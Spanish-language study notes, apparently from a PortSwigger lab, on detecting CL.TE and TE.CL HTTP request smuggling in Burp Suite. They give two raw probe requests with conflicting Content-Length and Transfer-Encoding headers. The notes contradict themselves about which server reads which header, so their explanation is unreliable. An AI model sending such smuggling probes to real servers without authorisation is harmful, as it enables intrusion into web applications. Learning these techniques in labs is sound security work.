El ataque de **CL.TE** (Content-Length to Transfer-Encoding), cuando el atacante usa la cabecera `Content-Length` para influenciar la interpretación del front-end, mientras que el back-end se ve influenciado por la cabecera `Transfer-Encoding`.

En la raiz editamos desde el burpsuite:
![[Pasted image 20240724142221.png]]
Dentro del código podemos probar diferentes http request y según su respuesta podemos confirmar que hay un tipo de vulnerabilidad. CL.TE es cuando el backend está leyendo el content length y el frontend está leyendo el transfer encoding
~~~
POST / HTTP/1.1\r\n
Host: Portsqiger-lab\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 6\r\n
Transfer-Encoding: chunked\r\n
\r\n
3\r\n
abc\r\n
X\r\n
~~~
CL.TE = Time out
![[Pasted image 20240724142448.png]]
El frontend va a interpretas la X como la finalización de la petición http pero el backend va a leer el chunked e interpetara el resto del código
~~~
POST / HTTP/1.1\r\n
Host: Portsqiger-lab\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 6\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
X
~~~
TE.CL = Time out

![[Pasted image 20240724142609.png]]
